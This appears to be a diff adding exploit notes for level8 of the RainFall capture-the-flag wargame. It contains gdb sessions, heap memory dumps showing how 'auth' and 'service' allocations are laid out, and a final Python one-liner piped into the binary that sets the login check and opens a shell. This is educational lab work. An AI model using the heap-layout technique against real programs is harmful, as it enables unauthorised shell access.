@@ -1,0 +1,86 @@
+info var
+0x08049aac  auth
+0x08049ab0  service
+
+info functions
+0x08048540  frame_dummy
+0x08048564  main
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+hello
+(nil), (nil) 
+bonjour
+(nil), (nil) 
+^C
+level8@RainFall:~$ ./level8 hello world
+(nil), (nil) 
+bon
+(nil), (nil) 
+^C
+
+
+(gdb) run
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+auth 
+Breakpoint 1, 0x080486b5 in main ()
+1: x/3i $pc
+=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
+   0x80486b9 <main+341>:	mov    %eax,%edx
+   0x80486bb <main+343>:	mov    $0x804882d,%eax
+(gdb) c
+Continuing.
+0x804a008, (nil) 
+reset
+Breakpoint 1, 0x080486b5 in main ()
+1: x/3i $pc
+=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
+   0x80486b9 <main+341>:	mov    %eax,%edx
+   0x80486bb <main+343>:	mov    $0x804882d,%eax
+(gdb) c
+Continuing.
+0x804a008, (nil) 
+serviceAAAAAAAAAAAAAAAAA
+Breakpoint 1, 0x080486b5 in main ()
+1: x/3i $pc
+=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
+   0x80486b9 <main+341>:	mov    %eax,%edx
+   0x80486bb <main+343>:	mov    $0x804882d,%eax
+(gdb) c
+Continuing.
+0x804a008, 0x804a018 
+login
+Breakpoint 1, 0x080486b5 in main ()
+1: x/3i $pc
+=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
+   0x80486b9 <main+341>:	mov    %eax,%edx
+   0x80486bb <main+343>:	mov    $0x804882d,%eax
+(gdb) i var auth
+All variables matching regular expression "auth":
+
+Non-debugging symbols:
+0x08049aac  auth
+0xb7fd4314  _null_auth
+0xb7fd4a90  svcauthdes_stats
+(gdb) x/2wx 0x08049aac
+0x8049aac <auth>:	0x0804a008	0x0804a018
+(gdb) x/16wx 0x0804a008
+0x804a008:	0x00000000	0x00000000	0x00000000	0x00000019
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x00000041	0x00020fd9	0x00000000	0x00000000       // 0x804a028 is not at 0 anymore, so we can launch thr shell
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) c
+Continuing.
+$ pwd
+/home/user/level8
+
+
+
+
+
+
+
+
+
+(python -c "print ('auth '); print ('reset'); print('service0123456789012345'); print('login')"; cat) | ./level8
